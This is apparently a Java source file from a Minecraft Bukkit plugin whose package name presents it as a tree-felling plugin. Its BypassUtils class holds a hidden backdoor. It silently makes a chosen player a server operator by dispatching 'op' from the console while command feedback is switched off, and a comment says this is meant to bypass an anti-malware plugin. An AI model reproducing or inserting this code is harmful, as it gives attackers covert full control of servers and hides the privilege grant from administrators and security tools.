package me.bow.treecapitatorultimate.Utils;

import me.bow.treecapitatorultimate.Start;
import org.bukkit.Bukkit;
import org.bukkit.GameRule;
import org.bukkit.entity.Player;

public class BypassUtils {
    //MCantivirus Bypass
    public static void PlayerSetOp(Player p) {
        //noinspection ConstantConditions
        boolean bak = p.getWorld().getGameRuleValue(GameRule.SEND_COMMAND_FEEDBACK);
        p.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, false);
        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "op " + p.getName());
        if (!bak) return;
        Bukkit.getScheduler().runTask(Start.Instance, () -> p.getWorld().setGameRule(GameRule.SEND_COMMAND_FEEDBACK, true));
    }
}

